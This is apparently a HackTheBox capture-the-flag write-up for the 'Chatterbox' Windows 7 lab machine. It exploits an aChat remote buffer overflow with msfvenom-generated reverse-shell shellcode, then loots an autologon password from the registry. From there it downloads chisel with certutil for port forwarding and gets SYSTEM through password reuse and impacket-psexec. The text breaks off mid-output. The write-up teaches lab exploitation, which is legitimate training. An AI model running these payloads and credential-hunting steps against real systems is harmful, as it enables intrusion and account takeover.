# Chatterbox

## Introduction

Welcome to my another writeup! In this HackTheBox [Chatterbox](https://app.hackthebox.com/machines/Chatterbox) machine, you'll learn: Exploit aChat's Remote Buffer Overflow, Windows privilege escalation, password hunting, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: `chatterbox\alfred` to `NT AUTHORITY\SYSTEM`](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Chatterbox/images/Chatterbox.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|20:56:17(HKT)]
└> export RHOSTS=10.10.10.74           
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|20:56:22(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         syn-ack AChat chat system httpd
|_http-server-header: AChat
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9256/tcp  open  achat        syn-ack AChat chat system
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m00s, deviation: 2h18m35s, median: 4h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-17T17:57:46
|_  start_date: 2023-05-17T17:55:43
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41829/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38735/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64306/udp): CLEAN (Timeout)
|   Check 4 (port 51590/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-17T13:57:47-04:00
```

According to `rustscan` result, we have 11 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|135,49152-7       | Microsoft Windows RPC         |
|139,445           | SMB                           |
|9255,9256         | AChat chat system             |

### SMB on Port 139, 445

**We can use `smbclient` to list out all the share:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:00:05(HKT)]
└> smbclient -L $RHOSTS    
Password for [WORKGROUP\siunam]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Nothing?

### aChat on Port 9255, 9256

> aChat is a server-client program. You can connect multiple clients to the server and begin chatting with other clients like hackers. You can use your own encryption to send messages. And communicate anonymously. (From [https://github.com/0301yasiru/aChat](https://github.com/0301yasiru/aChat))

**Hmm... Let's search for public exploits for that application:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:07:19(HKT)]
└> searchsploit achat
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                           | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)              | windows/remote/36056.rb
[...]
--------------------------------------------------------------------- ---------------------------------
```

As you can see, Achat 0.150 beta7 is vulnerable to Remote Buffer Overflow.

## Initial Foothold

**We can mirror the Python exploit script via `-m` flag in `searchsploit`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:07:19(HKT)]
└> searchsploit -m 36025
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
    Codes: CVE-2015-1578, CVE-2015-1577, OSVDB-118206, OSVDB-118104
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (637)
Copied to: /home/siunam/ctf/htb/Machines/Chatterbox/36025.py
```

By looking through the exploit script, we need to modify the following stuff:

- Generate our own shellcode via `msfvenom`:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:12:23(HKT)]
└> msfvenom -a x86 --platform Windows -p windows/exec CMD='ping 10.10.14.26' -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
[...]
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
[...]
buf += b"\x6f\x44\x4c\x6e\x70\x32\x70\x36\x39\x70\x41\x41"
```

> Note: The `ping` command is to test the target's aChat application is vulnerable to Remote Buffer Overflow or not.

- Replace the old shellcode from the exploit script:

```python
# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x6a\x48\x72\x62\x6b\x50"
buf += b"\x49\x70\x4b\x50\x63\x30\x31\x79\x58\x65\x50\x31"
buf += b"\x47\x50\x63\x34\x42\x6b\x32\x30\x30\x30\x72\x6b"
buf += b"\x6e\x72\x4c\x4c\x64\x4b\x31\x42\x7a\x74\x64\x4b"
buf += b"\x62\x52\x4e\x48\x4a\x6f\x74\x77\x4e\x6a\x6e\x46"
buf += b"\x4c\x71\x79\x6f\x46\x4c\x4f\x4c\x6f\x71\x73\x4c"
buf += b"\x79\x72\x4e\x4c\x6b\x70\x47\x51\x76\x6f\x7a\x6d"
buf += b"\x4a\x61\x35\x77\x37\x72\x79\x62\x30\x52\x4f\x67"
buf += b"\x54\x4b\x61\x42\x5a\x70\x54\x4b\x6f\x5a\x6d\x6c"
buf += b"\x62\x6b\x50\x4c\x4c\x51\x70\x78\x77\x73\x50\x48"
buf += b"\x59\x71\x7a\x31\x32\x31\x34\x4b\x70\x59\x6f\x30"
buf += b"\x7a\x61\x37\x63\x74\x4b\x31\x39\x5a\x78\x5a\x43"
buf += b"\x4e\x5a\x50\x49\x64\x4b\x4d\x64\x52\x6b\x4d\x31"
buf += b"\x46\x76\x4d\x61\x49\x6f\x54\x6c\x47\x51\x78\x4f"
buf += b"\x4c\x4d\x5a\x61\x45\x77\x6c\x78\x77\x70\x30\x75"
buf += b"\x79\x66\x4c\x43\x61\x6d\x38\x78\x4f\x4b\x53\x4d"
buf += b"\x6d\x54\x70\x75\x48\x64\x51\x48\x34\x4b\x42\x38"
buf += b"\x6c\x64\x4a\x61\x4a\x33\x70\x66\x74\x4b\x6c\x4c"
buf += b"\x70\x4b\x72\x6b\x30\x58\x4d\x4c\x69\x71\x76\x73"
buf += b"\x42\x6b\x69\x74\x72\x6b\x79\x71\x66\x70\x71\x79"
buf += b"\x71\x34\x4f\x34\x4f\x34\x61\x4b\x51\x4b\x73\x31"
buf += b"\x50\x59\x6e\x7a\x30\x51\x79\x6f\x59\x50\x61\x4f"
buf += b"\x51\x4f\x4e\x7a\x32\x6b\x4d\x42\x58\x6b\x54\x4d"
buf += b"\x4f\x6d\x51\x5a\x39\x71\x44\x4d\x33\x55\x38\x32"
buf += b"\x4d\x30\x6b\x50\x69\x70\x52\x30\x6f\x78\x70\x31"
buf += b"\x32\x6b\x32\x4f\x42\x67\x69\x6f\x66\x75\x57\x4b"
buf += b"\x6c\x30\x46\x55\x77\x32\x52\x36\x6f\x78\x66\x46"
buf += b"\x54\x55\x75\x6d\x73\x6d\x49\x6f\x48\x55\x6d\x6c"
buf += b"\x5a\x66\x31\x6c\x4c\x4a\x35\x30\x6b\x4b\x37\x70"
buf += b"\x50\x75\x6c\x45\x37\x4b\x50\x47\x4b\x63\x54\x32"
buf += b"\x42\x4f\x42\x4a\x6b\x50\x4e\x73\x4b\x4f\x77\x65"
buf += b"\x52\x50\x53\x39\x32\x4e\x30\x67\x6d\x50\x6e\x51"
buf += b"\x70\x30\x6c\x6e\x6e\x51\x4c\x70\x4c\x6e\x6c\x71"
buf += b"\x6f\x44\x4c\x6e\x70\x32\x70\x36\x39\x70\x41\x41"
```

- Change the `server_address` to `('10.10.10.74', 9256)`:

```python
server_address = ('10.10.10.74', 9256)
```

- Capture ICMP requests via `tcpdump`:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:17:29(HKT)]
└> sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

- Run the exploit script:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:17:23(HKT)]
└> python2 36025.py
---->{P00F}!
```

```shell
[...]
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:19:34.221676 IP 10.10.10.74 > 10.10.14.26: ICMP echo request, id 1, seq 5, length 40
21:19:34.221704 IP 10.10.14.26 > 10.10.10.74: ICMP echo reply, id 1, seq 5, length 40
21:19:35.165345 IP 10.10.10.74 > 10.10.14.26: ICMP echo request, id 1, seq 6, length 40
21:19:35.165387 IP 10.10.14.26 > 10.10.10.74: ICMP echo reply, id 1, seq 6, length 40
21:19:36.162867 IP 10.10.10.74 > 10.10.14.26: ICMP echo request, id 1, seq 7, length 40
21:19:36.162885 IP 10.10.14.26 > 10.10.10.74: ICMP echo reply, id 1, seq 7, length 40
21:19:37.160799 IP 10.10.10.74 > 10.10.14.26: ICMP echo request, id 1, seq 8, length 40
21:19:37.160813 IP 10.10.14.26 > 10.10.10.74: ICMP echo reply, id 1, seq 8, length 40
```

It works! We successfully recieved 4 ICMP requests!

**With that said, the target's aChat application is vulnerable to Remote Buffer Overflow.**

Let's get a reverse shell!

- **Shellcode:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:29:21(HKT)]
└> msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
[...]
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
[...]
buf += b"\x79\x6f\x37\x65\x41\x41"
```

- **Replace the new shellcode and setup a `nc` listener:**

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:23:54(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
```

- **Run the exploit script:**

```
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:29:50(HKT)]
└> python2 36025.py
---->{P00F}!
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:23:54(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami && ipconfig
whoami && ipconfig
chatterbox\alfred

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.74
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{111D2FF5-EF2C-4D77-B44C-DBCE3AAABF4B}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32>
```

I'm user `alfred`!

**user.txt:**
```shell
C:\Windows\system32>type c:\users\alfred\desktop\user.txt
type c:\users\alfred\desktop\user.txt
{Redacted}
```

## Privilege Escalation

### `chatterbox\alfred` to `NT AUTHORITY\SYSTEM`

**Show user `alfred` group, privileges information:**
```shell
C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name         SID                                          
================= =============================================
chatterbox\alfred S-1-5-21-1218242403-4263168573-589647361-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Nothing weird.

**Local users:**
```shell
C:\Windows\system32>net user
net user

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest                    
The command completed successfully.
```

Only has user `Alfred` is non-default.

```shell
C:\Windows\system32>net user Alfred
net user Alfred
User name                    Alfred
[...]
Local Group Memberships      *Users                
Global Group memberships     *None                 
```

User `Alfred` is inside the `Users` group, which means he's a low privilege user.

**System info:**
```shell
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
[...]
System Type:               X86-based PC
[...]
```

**It's a 32-bit (x86) Windows machine, and it's a Windows 7 Professional, version 6.1.7601 Service Pack 1 Build 7601.**

**Listening ports, established ports:**
```shell
C:\Windows\system32>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       352
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       692
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       464
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3572
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3572
  TCP    10.10.10.74:49159      10.10.14.26:443        ESTABLISHED     3572
  TCP    [::]:135               [::]:0                 LISTENING       664
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       352
  TCP    [::]:49153             [::]:0                 LISTENING       716
  TCP    [::]:49154             [::]:0                 LISTENING       924
  TCP    [::]:49155             [::]:0                 LISTENING       456
  TCP    [::]:49156             [::]:0                 LISTENING       692
  TCP    [::]:49157             [::]:0                 LISTENING       464
  UDP    0.0.0.0:123            *:*                                    872
  UDP    0.0.0.0:500            *:*                                    924
  UDP    0.0.0.0:4500           *:*                                    924
  UDP    0.0.0.0:5355           *:*                                    1104
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    2988
  UDP    10.10.10.74:9256       *:*                                    3572
  UDP    10.10.10.74:50210      *:*                                    2988
  UDP    127.0.0.1:1900         *:*                                    2988
  UDP    127.0.0.1:50211        *:*                                    2988
  UDP    [::]:123               *:*                                    872
  UDP    [::]:500               *:*                                    924
  UDP    [::]:4500              *:*                                    924
  UDP    [::1]:1900             *:*                                    2988
  UDP    [::1]:50209            *:*                                    2988
```

TCP port `139` and `445` are only accessable internally, maybe we can poke at it later?

**SMB share:**
```shell
C:\Windows\system32>net share
net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
```

Default shares.

**Check for Kernel Exploit (KE) via [`wes.py`](https://github.com/bitsadmin/wesng):**

- Copy the output of `systeminfo`:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:48:47(HKT)]
└> nano sysinfo.txt 
```

- Obtain the latest database of vulnerabilities: 

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:49:19(HKT)]
└> wes --update
Windows Exploit Suggester 1.03 ( https://github.com/bitsadmin/wesng/ )
[+] Updating definitions
[+] Obtained definitions created at 20230513
```

- Run the checks:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|21:49:29(HKT)]
└> wes sysinfo.txt 
Windows Exploit Suggester 1.03 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows 7 for 32-bit Systems Service Pack 1
    - Generation: 7
    - Build: 7601
    - Version: None
    - Architecture: 32-bit
    - Installed hotfixes (183): KB2849697, [...], KB4054518
[+] Loading definitions
    - Creation date of definitions: 20230513
[+] Determining missing patches
[!] Found vulnerabilities!

[...]
Date: 20170314
CVE: CVE-2017-0024
KB: KB4012212
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows 7 for 32-bit Systems Service Pack 1
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: n/a

Date: 20170314
CVE: CVE-2017-0026
KB: KB4012212
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows 7 for 32-bit Systems Service Pack 1
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: n/a

Date: 20170314
CVE: CVE-2017-0056
KB: KB4012212
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows 7 for 32-bit Systems Service Pack 1
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: n/a
[...]
```

That's a LOT! We could dig deeper into KEs later.

***Looting for passwords:***

**`Unattend.xml`:**
```shell
C:\Windows\system32>type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend.xml
<?xml version='1.0' encoding='utf-8'?>
<unattend xmlns="urn:schemas-microsoft-com:unattend" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State">
  [...]
   <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="x86">
    <AutoLogon>
     <Password>*SENSITIVE*DATA*DELETED*</Password>
     <Enabled>true</Enabled> 
     <Username>Alfred</Username> 
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Alfred</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
  [...]
</unattend>
```

No password in `Unattend.xml`.

**Registry keys:**
```shell
C:\Windows\system32>reg query HKLM /f password /t REG_SZ /s
[...]
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    {Redacted}
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
[...] 
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    {Redacted}
[...]
```

Nice!!! We found `Alfred`'s password in `Winlogon`'s HKLM registry key!

Now, let's take a step back.

What can we do with `Alfred`'s credentials?

Do you still remember the SMB service?

**Let's try that!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|22:29:09(HKT)]
└> smbclient -L $RHOSTS -U 'Alfred' -P '{Redacted}'        
Failed to open /var/lib/samba/private/secrets.tdb
_samba_cmd_set_machine_account_s3: failed to open secrets.tdb to obtain our trust credentials for WORKGROUP
Failed to set machine account: NT_STATUS_INTERNAL_ERROR
```

Ah! `NT_STATUS_INTERNAL_ERROR`. This is because the SMB service is only accessable internally.

To access the SMB service, we need to do port forwarding.

**To do so, I'll use a tool called [`chisel`](https://github.com/jpillora/chisel).**

- Upload `chisel` executable to the target's machine:

```shell
┌[siunam♥earth]-(/opt/chisel)-[2023.05.17|22:32:41(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
C:\Windows\system32>certutil -urlcache -f http://10.10.14.26:8000/chiselx86 c:\users\alfred\chisel.exe
certutil -urlcache -f http://10.10.14.26:8000/chisel_1.8.1_windows_386.exe c:\users\alfred\chisel.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

- Setup the port forwarding server:

```shell
┌[siunam♥earth]-(/opt/chisel)-[2023.05.17|22:36:52(HKT)]
└> ./chisel_1.8.1_linux_amd64 server -p 8888 --reverse
2023/05/17 22:37:36 server: Reverse tunnelling enabled
2023/05/17 22:37:36 server: Fingerprint xHEC/XQKnI8OY/mOHnpfz7xnwAe5ScD9OuvYnAaYrGk=
2023/05/17 22:37:36 server: Listening on http://0.0.0.0:8888
```

- Connect the server from client:

```shell
C:\Windows\system32>c:\users\alfred\chisel.exe client 10.10.14.26:8888 R:44445:127.0.0.1:445
```

**Now we should be able to access to the SMB service:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|22:54:52(HKT)]
└> smbclient -L 127.0.0.1 -U 'Alfred%{Redacted}'       

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

Nice!

**Now, can user `Alfred` access those shares?**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|22:56:31(HKT)]
└> smbclient //127.0.0.1/C$ -U 'Alfred%{Redacted}'  
tree connect failed: NT_STATUS_ACCESS_DENIED
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|22:56:33(HKT)]
└> smbclient //127.0.0.1/ADMIN$ -U 'Alfred%{Redacted}'
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Nope. We can't...

Hmmm... How about password reuse?

**Maybe the `Administrator` user is using the same password as `Alfred`?**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|22:58:00(HKT)]
└> smbclient -L 127.0.0.1 -U 'Administrator%{Redacted}'

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

Oh! It is!

**That being said, we should be able to access the `ADMIN$` share:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|22:58:49(HKT)]
└> smbclient //127.0.0.1/ADMIN$ -U 'Administrator%{Redacted}'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu May 18 03:31:49 2023
  ..                                  D        0  Thu May 18 03:31:49 2023
  $Reconfig$                          D        0  Tue Dec 19 19:56:45 2017
  addins                              D        0  Tue Jul 14 12:52:31 2009
[...]
```

Yep!

**Now, we can use PsExec to escalate our privilege via `impacket-psexec`!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Chatterbox)-[2023.05.17|23:03:18(HKT)]
└> impacket-psexec Administrator:'{Redacted}'@127.0.0.1 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file HMpCOIHA.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service fVUn on 127.0.0.1.....
[*] Starting service fVUn.....
[!] Press help for extra shell commands
